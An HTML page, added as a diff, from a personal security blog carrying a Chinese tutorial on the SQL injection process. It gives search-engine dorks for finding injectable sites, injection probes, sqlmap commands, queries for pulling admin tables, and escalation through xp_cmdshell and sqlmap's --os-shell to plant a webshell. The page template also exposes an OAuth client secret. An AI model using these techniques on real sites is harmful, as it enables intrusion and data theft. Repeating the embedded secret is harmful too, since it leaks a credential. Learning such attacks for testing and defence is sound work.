@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="心中有光の孩子">
+    <meta name="keyword"  content="tea9">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        1.1.1-SQL注入-SQL注入基础-SQL注入流程 - tea9的博客 | tea9&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 努力活着 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>tea9</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入流程"><span class="toc-text">SQL注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01-寻找SQL注入点"><span class="toc-text">01 寻找SQL注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#寻找SQL注入点"><span class="toc-text">寻找SQL注入点</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02-SQL注入流程"><span class="toc-text">02 SQL注入流程</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> 努力活着 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        1.1.1-SQL注入-SQL注入基础-SQL注入流程
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-06-11 00:00:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="01-寻找SQL注入点"><a href="#01-寻找SQL注入点" class="headerlink" title="01 寻找SQL注入点"></a>01 寻找SQL注入点</h4><h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><p>无特定目标：<br>inurl:.php?id=  </p>
+<p>有特定目标：<br>inurl:.php?id=site:target.com<br>// jsp sid   </p>
+<p>工具爬取：<br>spider,对搜索引擎和目标网站的链接进行爬取  </p>
+<p><strong>注入识别</strong><br>手工简单识别：  </p>
+<pre><code>&apos;
+and 1=1 / and 1=2
+and &apos;1&apos;=&apos;1 / and &apos;1&apos;=&apos;2 
+and 1 like 1 / and 1 like 2
+</code></pre><p>工具识别：  </p>
+<pre><code>sqlmap -m filename (filename中保存检测目标)
+sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
+</code></pre><p><strong>高级识别：</strong><br>扩展识别广度和深度：  </p>
+<pre><code>SqlMap --level 增加测试级别，对header中相关参数也进行测试
+sqlmap -r filename (filename中为网站请求数据)
+</code></pre><p>利用工具提高识别效率：</p>
+<pre><code>BurpSuite + SqlMap
+BurpSuite拦截所有浏览器访问提交的数据
+BurpSuite扩展插件，直接调用SqlMap进行测试
+</code></pre><p>一些Tips：  </p>
+<p>可以在参数后键入“*” 来确定想要测试的参数<br>可能出现注入的点：新闻、登录、搜索、留言… …<br>站在开发的角度去寻找  </p>
+<hr>
+<pre><code>python sqlmap.py -r 1.txt
+</code></pre><p>burp sqlmap 扩展<br>Burp-&gt; Extender-&gt;BApp Store -&gt; SQLiPy Sqlmap  </p>
+<p><strong>代码审计：</strong></p>
+<p>搜索关键代码和函数<br>梳理业务流程  </p>
+<p>强网杯WEB “python is the best language”  </p>
+<pre><code>http://test.com/register  
+POST:  
+
+username=test&amp;email=t@t.com&amp;password=123&amp;password2=123&amp;submit=Register  
+username=test&amp;email=t@t.com&apos; and &apos;1&apos; = &apos;1&amp;password=123&amp;password2=123&amp;submit=Register  
+</code></pre><h4 id="02-SQL注入流程"><a href="#02-SQL注入流程" class="headerlink" title="02 SQL注入流程"></a>02 SQL注入流程</h4><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png" alt=""></p>
+<p>数据获取</p>
+<pre><code>web.mdb
+
+select [*] from admin
+select [*] from system
+
+select [username] from system
+select [name] from system
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png" alt=""></p>
+<p>提权</p>
+<pre><code>xp.cmdshell
+
+--os-shell // 执行系统命令 写webshell到网站目录
+</code></pre>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/shaomiaosun">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/tea9">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://www.10000h.top">10000H</a></span>
+        <span>/</span>
+        
+        <span><a href="https://niexiaotao.com">Xiaotao&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script>
+    var gitment = new Gitment({
+        id: '1.1.1-SQL注入-SQL注入基础-SQL注入流程',
+        owner: 'tea9',
+        repo: 'tea9.github.io',
+        oauth: {
+            client_id: 'dd67fb84ddbc6cf9c112',
+            client_secret: 'be4e88389be3e45fbafbd7592148fa47feacaacf',
+        },
+    })
+    gitment.render('comment-container')
+</script>
+
+
+
+
+</html>
